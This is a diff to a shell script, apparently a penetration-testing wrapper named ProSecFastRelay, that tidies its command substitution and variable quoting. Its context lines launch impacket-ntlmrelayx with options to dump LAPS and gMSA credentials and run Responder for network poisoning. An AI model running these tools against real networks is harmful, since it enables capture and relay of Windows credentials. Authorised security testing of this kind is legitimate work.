@@ -3,9 +3,6 @@
 figlet ProSecFastRelay
 echo ''
 
-IP=$(ip addr show eth0 | grep "inet " | cut -d '/' -f1 | cut -d ' ' -f6)
-#echo '! > OwnIP eth0: '$IP
-
 if [ -s /root/input/ipint.txt ]; then
     echo "! >ipint.txt exists."
 else 
@@ -62,11 +59,11 @@ timeout 300 impacket-ntlmrelayx -6 -ts -ra --dump-laps --dump-gmsa -l /root/outp
 sleep 5
 timeout 300 responder -I eth0 -wvFP &> /root/output/responder.txt &
 
-PID_RELAY=`jobs -l | awk '/ntlmrelayx/ {print$2}'`
-PID_RESPONDER=`jobs -l | awk '/responder/ {print$2}'`
+PID_RELAY=$(jobs -l | awk '/ntlmrelayx/ {print$2}')
+PID_RESPONDER=$(jobs -l | awk '/responder/ {print$2}')
 
-wait $PID_RESPONDER
-wait $PID_RELAY
+wait "$PID_RESPONDER"
+wait "$PID_RELAY"
 
 #Python unbuffered reset to default
 unset PYTHONUNBUFFERED
